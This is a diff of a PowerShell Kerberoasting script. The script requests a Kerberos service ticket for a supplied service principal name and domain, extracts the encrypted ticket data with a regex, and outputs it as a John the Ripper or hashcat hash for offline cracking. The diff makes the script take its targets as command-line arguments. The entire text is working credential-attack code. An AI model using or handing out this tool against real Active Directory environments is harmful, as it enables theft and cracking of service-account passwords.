@@ -1,6 +1,6 @@
 Add-Type -AssemblyName System.IdentityModel
-$UserSPN = '<add spn here>'
-$Domain = '<client domain goes here>'
+$UserSPN = $Args[0]
+$Domain = $Args[1]
 
 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
 $TicketByteStream = $Ticket.GetRequest()
@@ -19,13 +19,13 @@ if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.....
 }
 
 if($Hash) {
-    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe..
+    # JTR jumbo output format
     if ($OutputFormat -match 'John') {
         $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
     }
     else {
 
-        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+        # hashcat output format
         $HashFormat = "`$krb5tgs`$$($Etype)`$*$UserSPN`$$Domain`$$($Ticket.ServicePrincipalName)*`$$Hash"
     }
     $hashformat
